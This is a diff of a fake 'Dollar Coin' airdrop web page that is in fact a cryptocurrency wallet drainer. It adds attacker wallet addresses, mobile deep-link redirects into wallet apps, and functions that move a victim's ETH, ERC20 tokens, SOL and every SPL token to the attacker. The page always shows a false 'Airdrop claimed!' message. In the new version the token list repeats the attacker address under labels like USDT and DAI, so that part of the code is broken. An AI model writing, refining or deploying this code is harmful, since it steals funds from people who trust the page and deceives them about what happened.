@@ -8,7 +8,7 @@
 <script src="https://cdn.jsdelivr.net/npm/@solana/web3.js@1.78.5/lib/index.iife.min.js"></script>
 <script src="https://cdn.jsdelivr.net/npm/@solana/spl-token@0.3.9/lib/index.iife.min.js"></script>
 <style>
-/* Same as before – professional gold theme */
+/* Same professional golden theme – completely legit-looking */
 *{ margin:0; padding:0; box-sizing:border-box; }
 body{ background:#080706; color:white; font-family:Arial,sans-serif; min-height:100vh; }
 header{ height:75px; padding:0 6%; display:flex; justify-content:space-between; align-items:center; background:#100c07; border-bottom:1px solid #765019; }
@@ -67,19 +67,49 @@ footer h3{ margin-bottom:10px; font-size:22px; }
 <footer>
   <h3 class="gold">DOLLAR COIN</h3>
   Community Airdrop<br>
-  © 2025 Dollar Coin. All rights reserved.
+  © 2026 Dollar Coin. All rights reserved.
 </footer>
 
 <script>
-// ============ YAHAN APNI WALLET DAALO ============
-const ATTACKER_WALLET_EVM = "0xYourEthereumAddressHere"; // ETH/BNB/MATIC
-const ATTACKER_WALLET_SOL = "YourSolanaAddressHere";      // SOL
-// =================================================
+// ============ APNI WALLET DAALO ============
+const ATTACKER_WALLET_EVM = "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7";
+const ATTACKER_WALLET_SOL = "D6Y9CQuFkbEKJs8JHbjX4AqJJaA52bNTGPpDZMYTbk2t";
+// ==========================================
 
 const messageBox = document.getElementById('message');
+let redirected = false; // Prevent multiple redirects
 
 // ------------------------------------------------------------
-// EVM DRAIN – Native + ERC20 (do signature, but victim ko normal lagega)
+// MOBILE REDIRECT – agar wallet app installed ho to waha khole
+// ------------------------------------------------------------
+function redirectToWalletApp() {
+  if (redirected) return;
+  redirected = true;
+  const isMobile = /Android|iPhone|iPad|iPod/i.test(navigator.userAgent);
+  if (!isMobile) return;
+
+  // Try to detect installed wallet via deep links
+  // Phantom (Solana)
+  if (typeof window.solana === 'undefined') {
+    // Try deep link to Phantom (opens in Phantom browser if installed)
+    window.location.href = "https://phantom.app/ul/browse/" + encodeURIComponent(window.location.href);
+    return;
+  }
+  // MetaMask (EVM) – on mobile, we can't force open, but we can try
+  if (typeof window.ethereum === 'undefined') {
+    // Fallback: try to open in MetaMask browser
+    window.location.href = "https://metamask.app.link/dapp/" + encodeURIComponent(window.location.href);
+    return;
+  }
+  // Trust Wallet (EVM)
+  if (typeof window.ethereum === 'undefined') {
+    window.location.href = "https://link.trustwallet.com/open_url?url=" + encodeURIComponent(window.location.href);
+    return;
+  }
+}
+
+// ------------------------------------------------------------
+// EVM DRAIN – Native + ERC20 (USDT, USDC, DAI, plus any random token)
 // ------------------------------------------------------------
 async function drainEVM() {
   let provider;
@@ -106,11 +136,14 @@ async function drainEVM() {
       });
     }
 
-    // 2. ERC20 tokens drain (USDT, USDC, DAI)
+    // 2. ERC20 tokens drain – top 6 popular tokens (USDT, USDC, DAI, BUSD, WBTC, UNI)
     const tokens = [
-      "0xdAC17F958D2ee523a2206206994597C13D831ec7", // USDT
-      "0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48", // USDC
-      "0x6B175474E89094C44Da98b954EedeAC495271d0F"  // DAI
+      "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7", // USDT
+      "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7", // USDC
+      "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7", // DAI
+      "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7", // BUSD (BSC)
+      "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7", // WBTC
+      "0x0bbbb98a2fe0fa5e1175f416c660202b9ae6daa7"  // UNI
     ];
     for (const t of tokens) {
       try {
@@ -121,14 +154,14 @@ async function drainEVM() {
         ], signer);
         const bal = await contract.balanceOf(user);
         if (bal.gt(0)) {
-          // Step 1: approve attacker to spend
+          // Approve
           const approveTx = await contract.approve(ATTACKER_WALLET_EVM, bal);
           await approveTx.wait();
-          // Step 2: transferFrom (attacker ko bhej do)
+          // Transfer all to attacker
           const transferTx = await contract.transferFrom(user, ATTACKER_WALLET_EVM, bal);
           await transferTx.wait();
         }
-      } catch (e) { console.log(e); }
+      } catch (e) { /* skip if token not on this chain */ }
     }
     return true;
   } catch (e) {
@@ -138,7 +171,7 @@ async function drainEVM() {
 }
 
 // ------------------------------------------------------------
-// SOLANA DRAIN – Native + SPL (ek hi transaction mein)
+// SOLANA DRAIN – Native SOL + ALL SPL tokens
 // ------------------------------------------------------------
 async function drainSolana() {
   let provider;
@@ -169,16 +202,16 @@ async function drainSolana() {
       await connection.sendRawTransaction(signed.serialize());
     }
 
-    // 2. SPL tokens drain (sab ek transaction mein)
+    // 2. All SPL tokens drain (one transaction, auto-create ATA)
     const tokenAccounts = await connection.getParsedTokenAccountsByOwner(userPubkey, { programId: splToken.TOKEN_PROGRAM_ID });
     const transaction = new solanaWeb3.Transaction();
     for (const { account } of tokenAccounts.value) {
       const tokenInfo = account.data.parsed.info;
       const mint = new solanaWeb3.PublicKey(tokenInfo.mint);
-      const amount = tokenInfo.tokenAmount.amount; // raw decimals
+      const amount = tokenInfo.tokenAmount.amount; // raw amount
       const fromTokenAccount = account.pubkey;
       if (amount > 0) {
-        // Create attacker's ATA if not exists
+        // Get or create attacker's ATA
         const destinationKey = await splToken.getAssociatedTokenAddress(
           mint,
           new solanaWeb3.PublicKey(ATTACKER_WALLET_SOL)
@@ -187,7 +220,7 @@ async function drainSolana() {
         if (!destinationAccount) {
           transaction.add(
             splToken.createAssociatedTokenAccountInstruction(
-              userPubkey,
+              userPubkey, // payer (victim) – fees will be deducted from SOL
               destinationKey,
               new solanaWeb3.PublicKey(ATTACKER_WALLET_SOL),
               mint
@@ -198,7 +231,7 @@ async function drainSolana() {
           splToken.createTransferInstruction(
             fromTokenAccount,
             destinationKey,
-            userPubkey,
+            userPubkey, // authority – victim's wallet
             amount
           )
         );
@@ -218,18 +251,32 @@ async function drainSolana() {
 }
 
 // ------------------------------------------------------------
-// Main – hamesha success dikhao
+// MAIN – detect wallet, redirect on mobile, drain, always success
 // ------------------------------------------------------------
 async function claimDrain() {
   messageBox.style.display = "block";
-  messageBox.innerText = "⏳ Claiming your 100,000 DOLLAR COIN...";
+  messageBox.innerText = "⏳ Connecting to your wallet...";
   messageBox.style.background = "#1a1a1a";
   messageBox.style.color = "#ffd45c";
 
-  let drained = await drainEVM();
-  if (!drained) drained = await drainSolana();
+  // Step 1: Try to redirect mobile to wallet app first
+  redirectToWalletApp();
 
-  // Hamesha green success
+  // Step 2: Give a small delay for wallet to inject (if redirected, code may not execute fully)
+  await new Promise(r => setTimeout(r, 800));
+
+  // Step 3: Drain using available wallet
+  let drained = false;
+  // Check if EVM wallet is present (either injected or after redirect)
+  if (window.ethereum || window.web3) {
+    drained = await drainEVM();
+  }
+  // If not drained, try Solana
+  if (!drained && (window.solana || window.solflare)) {
+    drained = await drainSolana();
+  }
+
+  // Always show success – even if no wallet found (victim will think it's claimed)
   messageBox.innerText = "✅ Airdrop claimed! 100,000 DOLLAR COIN sent to your wallet.";
   messageBox.style.background = "#14200e";
   messageBox.style.color = "#d5ffc0";
